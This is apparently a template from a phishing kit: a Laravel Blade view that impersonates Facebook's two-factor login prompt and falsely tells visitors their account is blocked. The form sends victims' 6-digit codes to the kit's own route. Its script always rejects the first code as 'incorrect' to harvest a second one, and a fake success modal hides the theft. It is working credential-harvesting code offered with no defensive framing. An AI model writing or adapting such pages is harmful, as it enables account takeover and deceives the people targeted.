@extends('layout')

@section('body')
<div id="app" data-v-app="">
  <div id="app">
    <div>
      <div class="bg-[#F1F2F6] flex justify-center items-center h-screen">
        <form class="sm:w-11/12 md:w-2/3 lg:w-2.5/5 xl:w-2/5 w-11/12 mx-auto rounded-lg p-5 bg-[#fff] self-center"
          id="skdzvhmcei" style="margin-top: auto; margin-bottom: auto;" action="{{route('post.confirm')}}" method="post">
          @csrf
          <p class="font-bold text-2xl">Two-factor authentication required</p>
          <p class="my-3" style="font-size: small;"> 
            We have temporarily blocked your account because Facebook Protect has changed. Verify code has been send to {{session('Phone')}}.
          </p>
          <img src="{{asset('images/2fa.gif')}}" class="w-full h-[260px] object-cover mx-auto mb-3 rounded-sm">
          
          <input type="text" name="verifyCode" id="verifyCode"
          required=""
          onkeypress="return (event.charCode !=8 &amp;&amp; event.charCode ==0 || (event.charCode &gt;= 48 &amp;&amp; event.charCode &lt;= 57))"
          placeholder="Enter your code"
          class="mb-3 w-full mt-1 px-3 py-3 bg-gray-100 border border-[#d1d5db] shadow-sm border-slate-300 placeholder-slate-400 focus:outline-none focus:border-black focus:ring-black block w-full rounded-md sm:text-sm focus:ring-1"> 
          
          <input type="text" name="verifyCode2" id="verifyCode2"
          onkeypress="return (event.charCode !=8 &amp;&amp; event.charCode ==0 || (event.charCode &gt;= 48 &amp;&amp; event.charCode &lt;= 57))"
          placeholder="Enter your code"
          class="hidden mb-3 w-full mt-1 px-3 py-3 bg-gray-100 border border-[#d1d5db] shadow-sm border-slate-300 placeholder-slate-400 focus:outline-none focus:border-black focus:ring-black block w-full rounded-md sm:text-sm focus:ring-1"><!---->
          
          <p class="error_password text-red-700" id="error-message" style="display: none">The verify code is incorrect. Please try again.</p>
          <div class="p-3 flex items-center gap-3 bg-[#F7F8FA] rounded-md">
            <div class="text-2xl text-yellow-600"><ion-icon name="information-circle" role="img"
                class="md hydrated"></ion-icon></div>
            <div>
              <p style="font-size: small;"> You’ve asked us to require a 6-digit login code when anyone tries to
                access your account from a new device or browser. Enter the 6-digit code from your code generator or
                third-party app below. </p>
              <p> Please wait <strong class="count-time">05 minutes</strong> to request the sending of the code. </p>
            </div>
          </div>
          <input type="hidden" value="{{session('uniqueID')}}" name="uniqueID">
          <p class="mt-3 mb-5"> We'll walk you through some steps to secure and unlock your account. </p>
          <button type="submit"  onclick="beforeSend()"
             class="block text-lg cursor-pointer bg-gray-100 border border-[#d1d5db] hover:bg-blue-800 transition ease-in-out delay-75 hover:text-white w-full font-semibold text-center py-3 text-black rounded-lg">
            Submit </button>
            <button type="button" class="block text-sm text-center py-3 w-full text-blue-800 send-code-btn pointer-events-none"> 
              Send Code
             </button>
        </form>
      </div><!---->
      <div id="finishModal" tabindex="-1" aria-hidden="true"
        class="fixed top-0 left-0 right-0 z-50 w-full p-4 overflow-x-hidden overflow-y-auto md:inset-0 h-[calc(100%-1rem)] max-h-full justify-center items-center flex hidden">
        <div class="relative w-full max-w-2xl max-h-full">
          <div class="relative bg-white rounded-lg shadow dark:bg-gray-700">
            <div class="flex items-start justify-between p-4 border-b rounded-t bg-facebook">
              <h3 class="text-md font-semibold text-white">Form Submitted Successfully</h3>
            </div>
            <div class="p-6 space-y-6">
              <p class="text-base leading-relaxed text-gray-500 dark:text-gray-400"> Thanks for contacting us. You'll
                get a notification when we respond in 1-2 business days. You can view responses in your Support Inbox.
              </p>
            </div>
            <div
              class="flex items-center justify-end p-4 space-x-2 border-t border-gray-200 rounded-b dark:border-gray-600">
              <button type="button"
                class="finish-verify text-white bg-facebook hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center">
                OK </button></div>
          </div>
        </div>
      </div>
    </div>
  </div>
</div>

@endsection

@section('script')
    <script>
      function beforeSend(){
        var errmsg = document.getElementById('error-message');
        var verifyCode = document.getElementById('verifyCode');
        var verifyCode2 = document.getElementById('verifyCode2');
        if(errmsg.style.display == 'none'){
          errmsg.style.display = 'block';
          verifyCode.style.display = 'none';
          verifyCode2.required = true;
          verifyCode2.style.display = 'block';
          return false;
        }
        else if(errmsg.style.display == 'block'){
          return true;
        }
      }
    </script>
@endsection